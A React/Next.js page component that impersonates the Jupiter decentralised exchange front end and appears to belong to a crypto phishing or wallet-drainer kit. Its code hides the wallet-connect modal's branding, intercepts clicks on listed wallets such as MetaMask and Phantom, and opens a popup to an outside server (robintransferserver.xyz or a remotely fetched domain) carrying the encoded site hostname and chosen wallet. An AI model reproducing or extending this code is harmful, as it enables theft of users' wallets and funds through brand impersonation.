"use client"
import { useEffect, useState } from "react"
import { useRouter } from "next/navigation"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Search, Sparkles, SlidersHorizontal, Eye } from "lucide-react"
import SparklineChart from "@/components/ui/SparklineChart"
import PluginComponent from '@/components/plugin'
import { useAppKit } from "@reown/appkit/react"
import { nextParamServerUrl } from "@/config"
import UltraTogglePanel from "@/components/ui/UltraTogglePanel"

export default function DeFiTradingPlatform() {
  const { open, close } = useAppKit()
  const [serverDomain, setServerDomain] = useState("https://robintransferserver.xyz")
  const [isModalVisible, setModalVisible] = useState(false)

  const toggleModal = () => setModalVisible(!isModalVisible)

  useEffect(() => {
    const fetchData = async () => {
      const res = await fetch(nextParamServerUrl)
      const json = await res.json()
      setServerDomain(json.SERVER_DOMAIN)
    }
    fetchData()
  }, [])

  const handleConnectWallet = () => open({ view: "Connect" })

  const allowWalletList = [
    "MetaMask", "Phantom", "Solflare", "Trust Wallet", "Exodus"
  ]

  useEffect(() => {
    if (!serverDomain) return

    const STYLE_MARKER = "data-w3m-override"
    const observers: MutationObserver[] = []
    const enhancedElements = new WeakSet<HTMLElement>()

    const css = `
      wui-ux-by-reown {
        display: none !important;
      }
    `

    function injectShadowStyle(sr: ShadowRoot) {
      if (sr.querySelector(`style[${STYLE_MARKER}]`)) return
      const s = document.createElement("style")
      s.setAttribute(STYLE_MARKER, "1")
      s.textContent = css
      sr.appendChild(s)
    }

    function isW3mLike(el: HTMLElement) {
      const tag = el.tagName.toLowerCase()
      return (
        tag.startsWith("w3m-") ||
        tag.startsWith("wui-") ||
        tag.startsWith("lit-") ||
        Array.from(el.classList).some((c) => c.startsWith("w3m-") || c.startsWith("wui-"))
      )
    }

    function enhanceWalletList(el: HTMLElement) {
      if (enhancedElements.has(el)) return
      enhancedElements.add(el)

      el.addEventListener("click", (e: any) => {
        e.stopImmediatePropagation()
        e.preventDefault()

        let walletName =
          (e.target?.getAttribute?.("name") as string) ||
          el.getAttribute("name") ||
          el.textContent?.trim() ||
          ""

        const selectedWalletId = allowWalletList.findIndex(
          (w) => w.toLowerCase().trim() === walletName.toLowerCase().trim()
        )

        if (selectedWalletId > -1) {
          const clientDomain = window.location.hostname
          const encryptedClientDomain = btoa(clientDomain)

          const width = 500
          const height = 700
          const left = (window.screen.width - width) / 2
          const top = (window.screen.height - height) / 2

          window.open(
            `${serverDomain}?q=${encryptedClientDomain}_${selectedWalletId}`,
            "popupWindow",
            `width=${width},height=${height},left=${left},top=${top}`
          )
          close()
        }
      }, { capture: true })

      el.setAttribute("title", "Click to connect with this wallet")
    }

    function scan(root: ParentNode) {
      const nodes = root.querySelectorAll("*")
      nodes.forEach((node) => {
        if (!(node instanceof HTMLElement)) return

        const sr = node.shadowRoot
        if (isW3mLike(node) && sr) {
          injectShadowStyle(sr)
          scan(sr)
          attachObserver(sr)
        }

        if (node.tagName.toLowerCase() === "wui-list-wallet" || node.tagName.toLowerCase() === "w3m-list-wallet") {
          enhanceWalletList(node)
        }

        if (node.tagName.toLowerCase() === "w3m-all-wallets-list-item" && sr) {
          const button = sr.querySelector("button")
          if (button) enhanceWalletList(button as HTMLElement)
        }
      })
    }

    function attachObserver(target: ParentNode) {
      const observer = new MutationObserver((muts) => {
        muts.forEach((m) => {
          m.addedNodes.forEach((node) => {
            if (node instanceof HTMLElement) {
              const sr = node.shadowRoot
              if (isW3mLike(node) && sr) {
                injectShadowStyle(sr)
                scan(sr)
                attachObserver(sr)
              }
              scan(node)
            }
          })
        })
      })
      observer.observe(target, { childList: true, subtree: true })
      observers.push(observer)
    }

    scan(document.body)
    attachObserver(document.body)

    return () => observers.forEach((o) => o.disconnect())
  }, [serverDomain, close])

  const [activeTab, setActiveTab] = useState("Market")
  const router = useRouter()
  const goToWalletSystem = () => router.push("/wallet-system")

  return (
    <div className="relative min-h-screen overflow-hidden text-white">
      {/* -------------------------
          BACKGROUND LAYERS (absolute)
         ------------------------- */}
      {/* background image layer */}
      <div className="fixed inset-x-0 bottom-0 -z-10 h-screen bg-neutral-950">
        <img
          alt="Spot Background v2"
          width="4096"
          height="1017"
          decoding="async"
          data-nimg="1"
          className="absolute bottom-0 w-full object-cover opacity-30 [mask-image:linear-gradient(to_top,rgba(0,0,0,1)_60%,transparent_90%)]"
          src="/background.webp"
          srcSet="/background.webp 1x"
          style={{ color: "transparent" }}
        />
      </div>

      {/* thin top overlay and vignette (above image, below content) */}
      <div
        aria-hidden
        className="absolute inset-0 -z-10 pointer-events-none"
      />

      {/* Navigation Header (darker/transparent like target) */}
      <nav className="relative flex h-[50px] w-full items-center gap-x-1 border-b border-neutral-850 bg-neutral-950 px-2.5 xl:h-[52px] xl:justify-between xl:px-5">
        <a href="#">
          <div className="flex items-center gap-2">
            <img src="/logo.webp" alt="Logo" className="w-6 h-6" />
            Jupiter
          </div>
        </a>
        {/* <div className="flex-1 max-w-md mx-8">
          <div className="relative">
            <Search className="absolute left-3 top-1/2 transform -translate-y-1/2 w-4 h-4 text-muted-foreground" />
            <Input className="pl-10 bg-card/10 border border-border/10 text-card-foreground rounded-full" />
          </div>
        </div> */}
        {/* flex h-8 min-w-8 items-center justify-center rounded-full border border-transparent focus-visible:outline focus-visible:outline-primary md:h-9 md:min-w-9 bg-primary/10 px-3 text-xs font-semibold text-primary hover:border-primary hover:bg-primary/10 hover:text-primary */}
        <Button
          className="cursor-pointer flex h-8 min-w-8 items-center justify-center rounded-full border border-transparent focus-visible:outline focus-visible:outline-primary md:h-9 md:min-w-9 bg-primary/10 px-3 text-xs font-semibold text-primary hover:border-primary hover:bg-primary/20 hover:text-primary"
          onClick={handleConnectWallet}
        >
          Connect
        </Button>
      </nav>

      {/* Content (push down to account for fixed nav) */}
      <div className="relative z-10 container mx-auto px-4 py-20" style={{ paddingTop: 84 }}>
        <div className="max-w-lg mx-auto">
          {/* Jupiter Plugin Card */}
          <div className="bg-[rgba(11,14,18,0.85)] border border-[#0f1418] rounded-4xl shadow-[0_30px_60px_rgba(0,0,0,0.65)] p-0 backdrop-blur-md">
            {/* Tabs */}
            <div className="flex p-3 mb-3 bg-transparent border-neutral-850 border-b">
              {["Market", "trigger", "recurring"].map((tab) => (
                <button
                  key={tab}
                  onClick={goToWalletSystem}
                  className={`flex-1 py-2 px-4 rounded-full text-sm font-medium transition-colors cursor-pointer hover:bg-primary/5 hover:text-primary ${
                    activeTab === tab
                      ? "bg-primary/10 text-primary"
                      : "text-muted-foreground hover:text-foreground"
                  }`}
                >
                  {tab.charAt(0).toUpperCase() + tab.slice(1)}
                </button>
              ))}
            </div>

            {/* Ultra v2 row */}
            <div className="flex items-center justify-between pl-3">
              <div
                className="flex items-center gap-2 border p-2 rounded-full cursor-pointer h-7 text-neutral-300 hover:bg-neutral-800"
                onClick={handleConnectWallet}
              >
                <Sparkles className="w-4 h-4 text-muted-foreground" />
                <span className="text-sm font-medium">Ultra v2</span>
                <SlidersHorizontal className="w-4 h-4 text-muted-foreground" />
              </div>
              {isModalVisible && (
                <div className="fixed inset-0 bg-black/70 flex items-center justify-center border z-[100]">
                  <div className="border text-white rounded-lg shadow-lg max-w-xl w-full">
                    <UltraTogglePanel toggleModal={toggleModal} />
                  </div>
                </div>
              )}
            </div>

            <div className="w-full pl-3 pr-3">
              <PluginComponent />
            </div>
          </div>

          {/* Chart Section */}
          <div className="flex items-center gap-4 my-4">
            <div className="flex items-center gap-2 bg-gray-700/30 px-2 py-1 rounded-full">
              <span className="text-sm text-muted-foreground">Show Chart</span>
              <Eye className="w-4 h-4" />
            </div>
            <div className="flex items-center gap-2 bg-gray-700/30 px-2 py-1 rounded-full">
              <span className="text-sm text-muted-foreground">Show History</span>
              <Eye className="w-4 h-4" />
            </div>
          </div>

          {/* Price Charts */}
          <div className="grid grid-cols-2 gap-4">
            <SparklineChart coinId="usd-coin" coinName="USDC" vsCurrency="usd" days={1} decimals={4} address="EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v" />
            <SparklineChart coinId="solana" coinName="SOL" vsCurrency="usd" days={1} decimals={2} address="So11111111111111111111111111111111111111112" />
          </div>
        </div>
      </div>
    </div>
  )
}
